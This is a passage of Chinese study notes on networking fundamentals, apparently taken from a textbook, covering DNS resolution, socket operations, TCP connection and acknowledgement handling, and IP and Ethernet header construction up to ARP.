②），完成应用程序委托的操作。像这样，由于调用了其他程序，原本运行的程序进入暂停状态，而被调用的程序开始运行，这就是“控制流程转移”。\n当控制流程转移到解析器后，解析器会生成要发送给 DNS 服务器的查询消息。这个过程与浏览器生成要发送给 Web 服务器的 HTTP 请求消息的过程类似，解析器会根据 DNS 的规格，生成一条表示“请告诉我 www.lab.glasscom.com 的 IP 地址”B 的数据，并将它发送给 DNS 服务器（图 1.12 ③）。发送消息这个操作并不是由解析器自身来执行，而是要委托给操作系统内部的协议栈 A 来执行。这是因为和浏览器一样，解析器本身也不具备使用网络收发数据的功能。解析器调用协议栈后，控制流程会再次转移，==协议栈（操作系统内部的网络控制软件，也叫“协议驱动” “TCP/IP 驱动”等）会执行发送消息的操作，然后通过网卡将消息发送给 DNS 服务器（图 1.12 ④⑤）。==\nDNS 服务器收到查询消息后，它会根据消息中的查询内容进行查询。\n总之，如果要访问的 Web 服务器已经在 DNS 服务器上注册，那么这条记录就能够被找到，然后其 IP 地址会被写入响应消息并返回给客户端（图 1.12 ⑥）。接下来，消息经过网络到达客户端，再经过协议栈被传递给解析器（图 1.12 ⑦⑧），然后解析器读取出消息取出 IP 地址，并将 IP 地址传递给应用程序（图 1.12 ⑨）。实际上，解析器会将取出的 IP 地址写入应用程序指定的内存地址中，图 1.11 用“\u0026lt; 内存地址 \u0026gt;”来表示，在实际的程序代码中应该写的是代表这一内存地址的名称。\n到这里，解析器的工作就完成了，控制流程重新回到应用程序（浏览器）。现在应用程序已经能够从内存中取出 IP 地址了，所以说 IP 地址是用这种方式传递给应用程序的。\n计算机的内部结构就是这样一层一层的。也就是说，很多程序组成不同的层次，彼此之间分工协作。当接到上层委派的操作时，本层的程序并不会完成所有的工作，而是会完成一部分工作，再将剩下的部分委派到下层来完成。\n1.3 全世界 DNS 服务器的大接力 DNS 服务器的基本工作 DNS 服务器的基本工作就是接收来自客户端的查询消息，然后根据消息的内容返回响应。\n其中，来自客户端的查询消息包含以下 3 种信息。\n（a）域名\n服务器、邮件服务器（邮件地址中 @ 后面的部分）的名称\n（b） Class\n在最早设计 DNS 方案时，DNS 在互联网以外的其他网络中的应用也被考虑到了，而 Class 就是用来识别网络的信息。不过，如今除了互联网并没有其他的网络了，因此 Class 的值永远是代表互联网的 IN\n（c）记录类型\n表示域名对应何种类型的记录。例如，当类型为 A 时，表示域名对应的是 IP 地址；当类型为 MX 时，表示域名对应的是邮件服务器。对于不同的记录类型，服务器向客户端返回的信息也会不同\nDNS 服务器上事先保存有前面这 3 种信息对应的记录数据，如图 1.14所示。DNS 服务器就是根据这些记录查找符合查询请求的内容并对客户端作出响应的。\n例如，如果要查询 www.lab.glasscom.com 这个域名对应的 IP 地址，客\n户端会向 DNS 服务器发送包含以下信息的查询消息。\n（a）域名 = www.lab.glasscom.com\n（b） Class = IN\n（c）记录类型 = A\n然后，DNS 服务器会从已有的记录中查找域名、Class 和记录类型全部匹配的记录。假如 DNS 服务器中的记录如图 1.14 所示，那么第一行记录与查询消息中的 3 个项目完全一致。于是，DNS 服务器会将记录中的192.0.2.226 这个值返回给客户端。\n在查询 IP 地址时我们使用 A==（A 是 Address 的缩写）== 这个记录类型，而查询邮件服务器时则要使用 MX 类型==（Mail eXchange，邮件交换）==。这是因为在 DNS 服务器上，IP 地址是保存在 A 记录中的，而邮件服务器则是保存在 MX 记录中的。例如，对于一个邮件地址tone@glasscom.com，当需要知道这个地址对应的邮件服务器时，我们需要提供 @ 后面的那一串名称。查询消息的内容如下。\n（a）域名 = glasscom.com\n（b） Class = IN\n（c）记录类型 = MX\nDNS 服务器会返回 10 和 mail.glasscom.com 这两条信息。当记录类型为 MX 时，DNS 服务器会在记录中保存两种信息，分别是邮件服务器的域名和优先级 A。此外，MX 记录的返回消息还包括邮件服务器 mail.glasscom.com 的 IP 地址。上表的第三行就是 mail.glasscom.com 的 IP 地址，因此只要用 mail.glasscom.com 的域名就可以找到这条记录。在这个例子中，我们得到的 IP 地址是 192.0.2.227。\n综上所述，DNS 服务器的基本工作就是根据需要查询的域名和记录类型查找相关的记录，并向客户端返回响应消息\n域名的层次结构 首先，==DNS服务器中的所有信息都是按照域名以分层次的结构来保存的。==层次结构这个词听起来可能有点不容易懂，其实就类似于公司中的事业集团、部门、科室这样的结构。层次结构能够帮助我们更好地管理大量的信息。\nDNS中的域名都是用句点来分隔的，比如 www.lab.glasscom.com，这里的句点代表了不同层次之间的界限，就相当于公司里面的组织结构不用部、科之类的名称来划分，只是用句点来分隔而已。在域名中，==越靠右的位置表示其层级越高==，比如 www.lab.glasscom.com这个域名如果按照公司里的组织结构来说，大概就是“com事业集团glasscom部 lab科的www\u0026quot;这样。其中，相当于一个层级的部分称为域。因此，com域的下一层是glasscom域，再下一层是 lab域，再下面才是www这个名字。\n寻找相应的 DNS 服务器并获取 IP 地址 首先，将负责管理下级域的 DNS 服务器的 IP 地址注册到它们的上级 DNS 服务器中，然后上级 DNS 服务器的 IP 地址再注册到更上一级的 DNS 服务器中，以此类推。也就是说，负责管理 lab.glasscom.com 这个域的 DNS 服务器的 IP 地址需要注册到 glasscom.com 域的 DNS服务器中，而 glasscom.com 域的 DNS 服务器的 IP 地址又需要注册到 com域的 DNS 服务器中。这样，我们就可以通过上级 DNS 服务器查询出下级DNS 服务器的 IP 地址，也就可以向下级 DNS 服务器发送查询请求了。\n除此之外还需要完成另一项工作，那就是将根域的 DNS 服务器信息保存在互联网中所有的 DNS 服务器中。这样一来，任何 DNS 服务器就都可以找到并访问根域 DNS 服务器了。因此，客户端只要能够找到任意一台DNS 服务器，就可以通过它找到根域 DNS 服务器，然后再一路顺藤摸瓜找到位于下层的某台目标 DNS 服务器（图 1.15）。分配给根域 DNS 服务器的 IP 地址在全世界仅有 13 个 ，而且这些地址几乎不发生变化，因此将这些地址保存在所有的 DNS 服务器中也并不是一件难事。\n如图 1.16 所示，客户端首先会访问最近的一台 DNS 服务器（也就是客户端的 TCP/IP 设置中填写的 DNS 服务器地址），假设我们要查询 www.lab.glasscom.com 这台 Web 服务器的相关信息（图 1.16 ①）。由于最近的 DNS 服务器中没有存放 www.lab.glasscom.com 这一域名对应的信息，所以我们需要从顶层开始向下查找。最近的 DNS 服务器中保存了根域 DNS 服务器的信息，因此它会将来自客户端的查询消息转发给根域 DNS 服务器（图 1.16 ②）。根域服务器中也没有 www.lab.glasscom.com 这个域名，但根据域名结构可以判断这个域名属于 com 域，因此根域 DNS 服务器会返回它所管理的 com 域中的DNS 服务器的 IP 地址，意思是“虽然我不知道你要查的那个域名的地址，但你可以去 com 域问问看”。接下来，最近的 DNS 服务器又会向 com 域的DNS 服务器发送查询消息（图 1.16 ③）。com 域中也没有 www.lab.glasscom.com这个域名的信息，和刚才一样，com 域服务器会返回它下面的 glasscom.com域的 DNS 服务器的 IP 地址。以此类推，只要重复前面的步骤，就可以顺藤摸瓜找到目标 DNS 服务器（图 1.16 ⑤），只要向目标 DNS 服务器发送查询消息，就能够得到我们需要的答案，也就是 www.lab.glasscom.com 的 IP 地址了。\n收到客户端的查询消息之后，DNS 服务器会按照前面的方法来查询 IP地址，并返回给客户端（图 1.16 ⑥）。这样，客户端就知道了 Web 服务器的 IP 地址，也就能够对其进行访问了（图 1.16 ⑦）。\n1.4 委托协议栈发送消息 数据收发操作概览 要发送给 Web 服务器的 HTTP 消息是一种数字信息（digital data），因此也可以说是委托协议栈来发送数字信息。\n向操作系统内部的协议栈发出委托时，需要按照指定的顺序来调用 Socket 库中的程序组件。\n使用 Socket 库来收发数据的操作过程如图 1.17 所示 。简单来说，收发数据的两台计算机之间连接了一条数据通道，数据沿着这条通道流动，最终到达目的地。我们可以把数据通道想象成一条管道，将数据从一端送入管道，数据就会到达管道的另一端然后被取出。数据可以从任何一端被送入管道，数据的流动是双向的。不过，这并不是说现实中真的有这么一条管道，只是为了帮助大家理解数据收发操作的全貌。\n收发数据的整体思路就是这样，但还有一点也非常重要。光从图上来看，这条管道好像一开始就有，实际上并不是这样，在进行收发数据操作之前，双方需要先建立起这条管道才行。建立管道的关键在于管道两端的数据出入口，这些出入口称为套接字。我们需要先创建套接字，然后再将套接字连接起来形成管道。实际的过程是下面这样的。首先，服务器一方先创建套接字，然后等待客户端向该套接字连接管道 。当服务器进入等待状态时，客户端就可以连接管道了。具体来说，客户端也会先创建一个套接字，然后从该套接字延伸出管道，最后管道连接到服务器端的套接字上。当双方的套接字连接起来之后，通信准备就完成了。接下来，就像我们刚刚讲过的一样，只要将数据送入套接字就可以收发数据了。\n我们再来看一看收发数据操作结束时的情形。当数据全部发送完毕之后，连接的管道将会被断开。==管道在连接时是由客户端发起的==，但在断开时可以由客户端或服务器任意一方发起（Web 使用的 HTTP 协议规定，当 Web 服务器发送完响应消息之后，应该主动执行断开操作 ，因此 Web 服务器会首先调用close 来断开连接） 。其中一方断开后，另一方也会随之断开，当管道断开后，套接字也会被删除。到此为止，通信操作就结束了。\n综上所述，收发数据的操作分为若干个阶段，可以大致总结为以下 4 个。\n（1）创建套接字（创建套接字阶段）\n（2）将管道连接到服务器端的套接字上（连接阶段）\n（3）收发数据（通信阶段）\n（4）断开管道并删除套接字（断开阶段）\n在每个阶段，Socket 库中的程序组件都会被调用来执行相关的数据收发操作。不过，在探索其具体过程之前，我们来补充一点内容。==前面这 4个操作都是由操作系统中的协议栈来执行的==，浏览器等应用程序并不会自己去做连接管道、放入数据这些工作，而是==委托协议栈来代劳==。本章将要介绍的只是这个==“委托”==的操作。关于协议栈收到委托之后具体是如何连接管道和放入数据的，我们将在第 2 章介绍。此外，==这些委托的操作都是通过调用 Socket 库中的程序组件来执行的==，但这些数据通信用的程序组件其实仅仅充当了一个桥梁的角色，并不执行任何实质性的操作，==应用程序的委托内容最终会被原原本本地传递给协议栈==。因此，我们无法形象地展示这些程序组件到底完成了怎样的工作，与其勉强强调 Socket 库的存在，还不如将 Socket 库和协议栈看成一个整体并讲解它们的整体行为让人\n描述符：应用程序用来识别套接字的机制 IP 地址和端口号：客户端和服务器之间用来识别对方套接字的机制\n下面两个网址有什么不同？\na. http://www.nikkeibp.co.jp/sample\nb. http://www.nikkeibp.co.jp/sample/\n==a 中的 sample 代表文件名，b 中的 sample 代表目录名==\n第2章　用电信号传输TCP/IP数据——探索协议栈和网卡 2.1 创建套接字 协议栈的内部结构 图中最上面的部分是网络应用程序，也就是浏览器、电子邮件客户端、Web 服务器、电子邮件服务器等程序，它\n们会将收发数据等工作委派给下层的部分来完成。\n应用程序的下面是 Socket 库，其中包括解析器，解析器用来向 DNS服务器发出查询\n再下面就是操作系统内部了，其中包括协议栈。协议栈的上半部分有两块，分别是负责用 TCP 协议收发数据的部分和负责用 UDP 协议收发数据的部分，它们会接受应用程序的委托执行收发数据的操作。==像浏览器、邮件等一般的应用程序都是使用 TCP 收发数据的，而像 DNS 查询等收发较短的控制数据的时候则使用 UDP。==\n下面一半是用 IP 协议控制网络包收发操作的部分。在互联网上传送数据时，数据会被切分成一个一个的网络包 A，而将网络包发送给通信对象的操作就是由 IP 来负责的。此外，IP 中还包括 ICMP 协议和 ARP 协议。ICMP 用于告知网络包传送过程中产生的错误以及各种控制消息，ARP 用于根据 IP 地址查询相应的以太网 MAC 地址 。\nIP 下面的网卡驱动程序负责控制网卡硬件，而最下面的网卡则负责完成实际的收发操作，也就是对网线中的信号执行发送和接收的操作。\n套接字的实体就是通信控制信息 套接字中记录了用于控制通信操作的各种控制信息，协议栈则需要根据这些信息判断下一步的行动，这就是套接字的作用。\n协议栈是根据套接字中记录的控制信息来工作的。\n下面来看看真正的套接字。在 Windows 中可以用 netstat 命令显示套接字内容（图 2.2）。图中每一行相当于一个套接字，当创建套接字时，就会在这里增加一行新的控制信息，赋予“即将开始通信”的状态，并进行通信的准备工作，如分配用于临时存放收发数据的缓冲区空间。既然有图，我们就来讲讲图上这些到底都是什么意思。比如第 8 行，它表示 PIDB 为 4 的程序正在使用 IP 地址为 10.10.1.16 的网卡与 IP 地址为10.10.1.18 的对象进行通信。此外我们还可以看出，本机使用 1031 端口，对方使用 139 端口，而 139 端口是 Windows 文件服务器使用的端口，因此我们就能够看出这个套接字是连接到一台文件服务器的。我们再来看第 1 行，这一行表示 PID 为 984 的程序正在 135 端口等待另一方的连接，其中本地 IP 地址和远程 IP 地址都是 0.0.0.0，这表示通信还没开始，IP 地址不确定 。\n2.2 连接服务器 负责保存控制信息的头部 控制信息可以大体上分为两类。\n第一类是客户端和服务器相互联络时交换的控制信息。这些信息不仅连接时需要，包括数据收发和断开连接操作在内，整个通信过程中都需要，这些内容在 TCP 协议的规格中进行了定义。具体来说，表 2.1 中的这些字段就是 TCP 规格中定义的控制信息 。这些字段是固定的，在连接、收发、断开等各个阶段中，每次客户端和服务器之间进行通信时，都需要提供这些控制信息。具体来说，如图 2.4（a）所示，这些信息会被添加在客户端与服务器之间传递的网络包的开头。在连接阶段，由于数据收发还没有开始，所以如图 2.4（b）所示，网络包中没有实际的数据，只有控制信息。这些控制信息位于网络包的开头，因此被称为头部。此外，以太网和 IP 协议也有自己的控制信息，这些信息也叫头部，为了避免各种不同的头部发生混淆，我们一般会记作 TCP 头部、以太网头部 、IP 头部。\n控制信息还有另外一类，那就是保存在套接字中，用来控制协议栈操作的信息 。应用程序传递来的信息以及从通信对象接收到的信息都会保存在这里，还有收发数据操作的执行状态等信息也会保存在这里，协议栈会根据这些信息来执行每一步的操作。\n通信操作中使用的控制信息分为两类。 （1）头部中记录的信息 （2）套接字（协议栈中的内存空间）中记录的信息\n连接操作的实际过程 连接操作的第一步是在 TCP 模块处创建表示连接控制信息的头部。\n通过 TCP 头部中的发送方和接收方端口号可以找到要连接的套接字。\n2.3 收发数据 将 HTTP 请求消息交给协议栈 当控制流程从 connect 回到应用程序之后，接下来就进入数据收发阶段了。数据收发操作是从应用程序调用 write 将要发送的数据交给协议栈开始的\n如果一收到数据就马上发送出去，就可能会发送大量的小包，导致网络效率下降，因此需要在数据积累到一定量时再发送出去。至于要积累多少数据才能发送，不同种类和版本的操作系统会有所不同，不能一概而论，但都是根据下面几个要素来判断的。\n==第一个判断要素是每个网络包能容纳的数据长度==，协议栈会根据一个叫作 MTU 的参数来进行判断。MTU 表示一个网络包的最大长度。\n==另一个判断要素是时间==，当应用程序发送数据的频率不高的时候，如果每次都等到长度接近 MSS 时再发送，可能会因为等待时间太长而造成发送延迟，这种情况下，即便缓冲区中的数据长度没有达到 MSS，也应该果断发送出去。为此，协议栈的内部有一个计时器，当经过一定时间之后，就会把网络包发送出去。\n使用 ACK 号确认网络包已收到 到这里，网络包已经装好数据并发往服务器了，但数据发送操作还没有结束。TCP 具备确认对方是否成功收到网络包，以及当对方没收到时进行重发的功能，因此在发送网络包之后，接下来还需要进行确认操作。\n==通过“序号”和“ACK 号”可以确认接收方是否收到了网络包。==\n使用窗口有效管理 ACK 号 如图 2.10（a）所示，每发送一个包就等待一个 ACK 号的方式是最简单也最容易理解的，但在等待 ACK 号的这段时间中，如果什么都不做那实在太浪费了。为了减少这样的浪费，TCP 采用图 2.10（b）这样的滑动窗口方式来管理数据发送和 ACK 号的操作。所谓滑动窗口，就是在发送一个包之后，不等待 ACK 号返回，而是直接发送后续的一系列包。这样一来，等待 ACK 号的这段时间就被有效利用起来了。\n==接收方需要告诉发送方自己最多能接收多少数据，然后发送方根据这个值对数据发送操作进行控制，这就是滑动窗口方式的基本思路。==\n关于滑动窗口的具体工作方式，还是看图更容易理解（图 2.11）。在这张图中，接收方将数据暂存到接收缓冲区中并执行接收操作。当接收操作完成后，接收缓冲区中的空间会被释放出来，也就可以接收更多的数据了，这时接收方会通过 TCP 头部中的窗口字段将自己能接收的数据量告知发送方。这样一来，发送方就不会发送过多的数据，导致超出接收方的处理能力了\nACK 与窗口的合并 要提高收发数据的效率，还需要考虑另一个问题，那就是返回 ACK号和更新窗口的时机。\n==当接收方将数据传递给应用程序，导致接收缓冲区剩余容量增加时，就需要告知发送方，这就是更新窗口大小的时机。==\n==当接收方收到数据时，如果确认内容没有问题，就应该向发送方返回 ACK 号==，因此我们可以认为收到数据之后马上就应该进行这一操作。\n如果将前面两个因素结合起来看，首先，发送方的数据到达接收方，在接收操作完成之后就需要向发送方返回 ACK 号，而再经过一段时间 A，当数据传递给应用程序之后才需要更新窗口大小。但如果根据这样的设计来实现，每收到一个包，就需要向发送方分别发送 ACK 号和窗口更新这两个单独的包 B。这样一来，接收方发给发送方的包就太多了，导致网络效率下降。\n因此，==接收方在发送 ACK 号和窗口更新时，并不会马上把包发送出去，而是会等待一段时间==，在这个过程中很有可能会出现其他的通知操作，==这样就可以把两种通知合并在一个包里面发送了==。举个例子，在等待发送ACK 号的时候正好需要更新窗口，这时就可以把 ACK 号和窗口更新放在一个包里发送，从而减少包的数量。当需要连续发送多个 ACK 号时，也可以减少包的数量，这是因为 ACK 号表示的是已收到的数据量，也就是说，它是告诉发送方目前已接收的数据的最后位置在哪里，因此当需要连续发送 ACK 号时，只要发送最后一个 ACK 号就可以了，中间的可以全部省略。当需要连续发送多个窗口更新时也可以减少包的数量，因为连续发生窗口更新说明应用程序连续请求了数据，接收缓冲区的剩余空间连续增加。这种情况和 ACK 号一样，可以省略中间过程，只要发送最终的结果就可以了。\n接收 HTTP 响应消息 首先，协议栈会检查收到的数据块和 TCP 头部的内容，判断是否有数据丢失，如果没有问题则返回 ACK 号。然后，协议栈将数据块暂存到接收缓冲区中，并将数据块按顺序连接起来还原出原始的数据，最后将数据交给应用程序。具体来说，协议栈会将接收到的数据复制到应用程序指定的内存地址中，然后将控制流程交回应用程序。将数据交给应用程序之后，协议栈还需要找到合适的时机向发送方发送窗口更新 。\n2.4 从服务器断开并删除套接字 无论哪种情况，完成数据发送的一方会发起断开过程，这里我们以服务器一方发起断开过程为例来进行讲解。首先，服务器一方的应用程序会调用 Socket 库的 close 程序。然后，服务器的协议栈会生成包含断开信息的 TCP 头部，具体来说就是将控制位中的 FIN 比特设为 1。接下来，协议栈会委托 IP 模块向客户端发送数据（图 2.12 ①）。同时，服务器的套接字中也会记录下断开操作的相关信息。\n接下来轮到客户端了。当收到服务器发来的 FIN 为 1 的 TCP 头部时，客户端的协议栈会将自己的套接字标记为进入断开操作状态。然后，为了告知服务器已收到 FIN 为 1 的包，客户端会向服务器返回一个 ACK 号 （图 2.12 ②）。这些操作完成后，协议栈就可以等待应用程序来取数据了。\n过了一会儿，应用程序就会调用 read 来读取数据 。这时，协议栈不会向应用程序传递数据 ，而是会告知应用程序（浏览器）来自服务器的数据已经全部收到了。根据规则，服务器返回请求之后，Web 通信操作就全部结束了，因此只要收到服务器返回的所有数据，客户端的操作也就随之结束了。因此，客户端应用程序会调用 close 来结束数据收发操作，这时客户端的协议栈也会和服务器一样，生成一个 FIN 比特为 1 的 TCP 包，然后委托 IP 模块发送给服务器（图 2.12 ③）。一段时间之后，服务器就会返回ACK 号（图 2.12 ④）。到这里，客户端和服务器的通信就全部结束了。\n和服务器的通信结束之后，==用来通信的套接字也就不会再使用了，这时我们就可以删除这个套接字了==。不过，==套接字并不会立即被删除，而是会等待一段时间之后再被删除。等待这段时间是为了防止误操作。==\n数据收发操作小结 数据收发操作的第一步是创建套接字。一般来说，服务器一方的应用程序在启动时就会创建好套接字并进入等待连接的状态。客户端则一般是在用户触发特定动作，需要访问服务器的时候创建套接字。在这个阶段，还没有开始传输网络包。\n创建套接字之后，客户端会向服务器发起连接操作。首先，客户端会生成一个 SYN 为 1 的 TCP 包并发送给服务器（图 2.13 ①）。这个 TCP 包的头部还包含了客户端向服务器发送数据时使用的初始序号，以及服务器向客户端发送数据时需要用到的窗口大小 。当这个包到达服务器之后，服务器会返回一个 SYN 为 1 的 TCP 包（图 2.13 ②）。和图 2.13 ①一样，这个包的头部中也包含了序号和窗口大小，此外还包含表示确认已收到包①的ACK 号 。当这个包到达客户端时，客户端会向服务器返回一个包含表示确认的 ACK 号的 TCP 包（图 2.13 ③）。到这里，连接操作就完成了，双方进入数据收发阶段。\n数据收发阶段的操作根据应用程序的不同而有一些差异，以 Web 为例，首先客户端会向服务器发送请求消息。TCP 会将请求消息切分成一定大小的块，并在每一块前面加上 TCP 头部，然后发送给服务器（图 2.13 ④）。TCP 头部中包含序号，它表示当前发送的是第几个字节的数据。当服务器收到数据时，会向客户端返回 ACK 号（图 2.13 ⑤）。在最初的阶段，服务器只是不断接收数据，随着数据收发的进行，数据不断传递给应用程序，接收缓冲区就会被逐步释放。这时，服务器需要将新的窗口大小告知客户端。当服务器收到客户端的请求消息后，会向客户端返回响应消息，这个过程和刚才的过程正好相反（图 2.13 ⑥⑦）\n服务器的响应消息发送完毕之后，数据收发操作就结束了，这时就会开始执行断开操作。以 Web 为例，服务器会先发起断开过程 。在这个过程中，服务器先发送一个 FIN 为 1 的 TCP 包（图 2.13 ⑧），然后客户端返回一个表示确认收到的 ACK 号（图 2.13 ⑨）。接下来，双方还会交换一组方向相反的 FIN 为 1 的 TCP 包（图 2.13 ⑩）和包含 ACK 号的 TCP 包（图 2.13k）。最后，在等待一段时间后，套接字会被删除。\n2.5 IP与以太网的包收发操作 包的基本知识 包是由头部和数据两部分构成的（图 2.14（a））。头部包含目的地址等控制信息，大家可以把它理解为快递包裹的面单；头部后面就是委托方要发送给对方的数据，也就相当于快递包裹里的货物。一个包发往目的地的过程如图 2.15 所示。\nTCP/IP 包的结构是在这个基本结构的基础上扩展出来的，因此更加复杂。在第 1 章讲过子网的概念，还讲过网络中有路由器和集线器两种不同的转发设备，它们在传输网络包时有着各自的分工。\n（1）路由器根据目标地址判断下一个路由器的位置\n（2）集线器在子网中将网络包传输到下一个路由\n实际上，集线器是按照以太网规则传输包的设备，而路由器是按照 IP规则传输包的设备，因此我们也可以作如下理解。\n==（1）IP 协议根据目标地址判断下一个 IP 转发设备的位置==\n==（2）子网中的以太网协议将包传输到下一个转发设备==\n具体来说，如图 2.14（b）所示，TCP/IP 包包含如下两个头部。\n（a）MAC 头部（用于以太网协议）\n（b）IP 头部（用于 IP 协议）\n这两个头部分别具有不同的作用。首先，发送方将包的目的地，也就是要访问的服务器的 IP 地址写入 IP 头部中。这样一来，我们就知道这个包应该发往哪里，==IP 协议就可以根据这一地址查找包的传输方向，从而找到下一个路由器的位置，也就是图 2.16 中的路由器 R1==。接下来，IP 协议会委托以太网协议将包传输过去。这时，IP 协议会查找下一个路由器的以太网地址（MAC 地址），并将这个地址写入 MAC 头部中。这样一来，以太网协议就知道要将这个包发到哪一个路由器上了。\n网络包在传输过程中（图 2.16 ①）会经过集线器，集线器是根据以太网协议工作的设备。为了判断包接下来应该向什么地方传输，集线器里有一张表（用于以太网协议的表），可根据以太网头部中记录的目的地信息查出相应的传输方向。这张图中只有一个集线器，当存在多个集线器时，网络包会按顺序逐一通过这些集线器进行传输。\n接下来，包会到达下一个路由器（图 2.16 ②）。==路由器中有一张 IP 协议的表，可根据这张表以及 IP 头部中记录的目的地信息查出接下来应该发往哪个路由器==。为了将包发到下一个路由器，我们还需要==查出下一个路由器的 MAC 地址，并记录到 MAC 头部中==，大家可以理解为改写了 MAC 头部 。这样，网络包就又被发往下一个节点了。\n再往后的过程图上就没有画出来了。网络包会通过路由器到达下一个路由器 R2。这个过程不断重复，最终网络包就会被送到目的地，当目的地设备成功接收之后，网络包的传输过程就结束了。\n包收发操作概览 包收发操作的起点是 TCP 模块委托 IP 模块发送包的操作（图 2.17 中 的“①发送”）。这个委托的过程就是 TCP 模块在数据块的前面加上 TCP头部，然后整个传递给 IP 模块，这部分就是网络包的内容。与此同时，TCP 模块还需要指定通信对象的 IP 地址，也就是需要写清楚“将什么内容发给谁”。\n收到委托后，IP 模块会将包的内容当作一整块数据，在前面加上包含控制信息的头部。刚才我们讲过，IP 模块会添加 IP 头部和 MAC 头部这两种头部。==IP 头部中包含 IP 协议规定的、根据 IP 地址将包发往目的地所需的控制信息；MAC 头部包含通过以太网的局域网将包传输至最近的路由器所需的控制信息==。关于 IP 头部和 MAC 头部的区别以及其中包含的控制信息的含义，我们将稍后介绍。总之，加上这两个头部之后，一个包就封装好了，这些就是 IP 模块负责的工作。\n接下来，封装好的包会被交给网络硬件（图 2.17 中的“②发送”），例如以太网、无线局域网等。网络硬件可能是插在计算机主板上的板卡，也可能是笔记本电脑上的 PCMCIA 卡，或者是计算机主板上集成的芯片，不同形态的硬件名字也不一样，本书将它们统称为网卡 。传递给网卡的网络包是由一连串 0 和 1 组成的数字信息，网卡会将这些数字信息转换为电信号或光信号，并通过网线（或光纤）发送出去，然后这些信号就会到达集线器、路由器等转发设备，再由转发设备一步一步地送达接收方。\n包送达对方之后，对方会作出响应。返回的包也会通过转发设备发送回来，然后我们需要接收这个包。接收的过程和发送的过程是相反的，信息先以电信号的形式从网线传输进来，然后由网卡将其转换为数字信息并传递给 IP 模块（图 2.17 中的“③接收”）。接下来，IP 模块会将 MAC 头部和 IP 头部后面的内容，也就是 TCP 头部加上数据块，传递给 TCP 模块。接下来的操作就是我们之前讲过的 TCP 模块负责的部分了\n把集成在主板上的网络硬件叫作“网卡”可能听上去有些奇怪，从这个意义上来看应该叫作“网络接口”比较准确。不过，也有接在 USB 接口上的网卡，在计算机的领域中，“接口”这个词有时候会带来更多的歧义。在计算机和网络行业中，有很多术语的用法其实都比较混乱。\n==IP 的包收发操作都是相同的，并不会因包本身而有所区别。====因为 IP 模块会将 TCP 头部和数据块看作一整块二进制数据==，在执行收发操作时并不关心其中的内容，也不关心这个包是包含 TCP 头部和数据两者都有呢，还是只有 TCP 头部而没有数据。\n生成包含接收方 IP 地址的 IP 头部 IP 头部中还需要填写发送方的 IP 地址，大家可以认为是发送方计算机的 IP 地址 ，实际上“计算机的 IP 地址”这种说法并不准确。一般的客户端计算机上只有一块网卡，因此也就只有一个 IP 地址，这种情况下我们可以认为这个 IP 地址就是计算机的 IP 地址，但如果计算机上有多个网卡，情况就没那么简单了。==IP 地址实际上并不是分配给计算机的，而是分配给网卡的==，因此当计算机上存在多块网卡时，每一块网卡都会有自己的 IP 地 址。很多服务器上都会安装多块网卡，这时一台计算机就有多个 IP 地址，在填写发送方 IP 地址时就需要判断到底应该填写哪个地址。这个判断相当于在多块网卡中判断应该使用哪一块网卡来发送这个包，也就相当于判断应该把包发往哪个路由器，因此只要确定了目标路由器，也就确定了应该使用哪块网卡，也就确定了发送方的 IP 地址。\nIP 头部的“接收方 IP 地址”填写通信对象的 IP 地址。 发送方 IP 地址需要判断发送所使用的网卡，并填写该网卡的 IP地址。\n如何判断应该把包交给哪块网卡呢？其实和图 2.16 中路由器使用 IP 表判断下一个路由器位置的操作是一样的。因为协议栈的 IP模块与路由器中负责包收发的部分都是根据 IP 协议规则来进行包收发操作的，所以它们也都用相同的方法来判断把包发送给谁。\n这个“IP 表”叫作==路由表== ，我们将在第 3 章探索路由器时详细介绍它的用法，这里先简单讲个大概。如图 2.18 所示，我们可以通过 route print命令来显示路由表，下面来边看边讲。首先，我们对套接字中记录的目的地 IP 地址与路由表左侧的 Network Destination 栏进行比较，找到对应的一行。例如，TCP 模块告知的目标 IP 地址为 192.168.1.21，那么就对应图 2.18 中的第 6 行，因为它和 192.168.1 的部分相匹配。如果目标 IP 地址为 10.10.1.166，那么就和 10.10.1 的部分相匹配，所以对应第 3 行。以此类推，我们需要找到与 IP 地址左边部分相匹配的条目 ，找到相应的条目之后，接下来看从右边数第 2 列和第 3 列的内容。右起第 2 列，也就是Interface 列，表示网卡等网络接口，这些网络接口可以将包发送给通信对象。此外，右起第 3 列，即 Gateway 列表示下一个路由器的 IP 地址，将包发给这个 IP 地址，该地址对应的路由器 ==（Gateway（网关）在 TCP/IP 的世界里就是路由器的意思）==就会将包转发到目标地址==（如果 Gateway 和 Interface 列的 IP 地址相同，就表示不需要路由器进行转发，可以直接将包发给接收方的 IP 地址）==。路由表的第 1 行中，目标地址和子网掩码 A都是 0.0.0.0，这表示默认网关，如果其他所有条目都无法匹配，就会自动匹配这一行 。\n这样一来，我们就可以判断出应该使用哪块网卡来发送包了，然后就可以在 IP 头部的发送方 IP 地址中填上这块网卡对应的 IP 地址。\n接下来还需要填写协议号，它表示包的内容是来自哪个模块的。例如，如果是 TCP 模块委托的内容，则设置为 06（十六进制），如果是 UDP 模块委托的内容，则设置为 17（十六进制），这些值都是按照规则来设置的。在现在我们使用的浏览器中，HTTP 请求消息都是通过 TCP 来传输的，因此这里就会填写表示 TCP 的 06（十六进制）\n生成以太网用的 MAC 头部 生成了 IP 头部之后，接下来 IP 模块还需要在 IP 头部的前面加上MAC（Media Access Control） 头部（表 2.3）。IP 头部中的接收方 IP 地址表示网络包的目的地，通过这个地址我们就可以判断要将包发到哪里，但在以太网的世界中，TCP/IP 的这个思路是行不通的。以太网在判断网络包目的地时和 TCP/IP 的方式不同，因此必须采用相匹配的方式才能在以太网中将包发往目的地，而MAC 头部就是干这个用的。\n在生成 MAC 头部时，只要设置表 2.3 中的 3 个字段就可以了。方便起见，我们按照从下往上的顺序来对表进行讲解。首先是“以太类型”，这里填写表示 IP 协议的值 0800（十六进制）。接下来是发送方 MAC 地址，这里填写网卡本身的 MAC 地址。MAC 地址是在网卡生产时写入 ROM 里的，只要将这个值读取出来写入 MAC 头部就可以了。\n而接收方 MAC 地址就有点复杂了。在这个时间点上，我们还没有把包发送出去，所以先得搞清楚应该把包发给谁，这个只要查一下路由表就知道了。在路由表中找到相匹配的条目，然后把包发给 Gateway 列中的IP 地址就可以了。既然已经知道了包应该发给谁，那么只要将对方的 MAC 地址填上去就好了，但到这里为止根本没有出现对方的 MAC 地址，也就是说我们现在根本不知道对方的 MAC 地址是什么。因此，我们还需要执行根据 IP 地址查询 MAC 地址的操作。\nIP 模块根据路由表 Gateway 栏的内容判断应该把包发送给谁。\n通过 ARP （ARP：Address Resolution 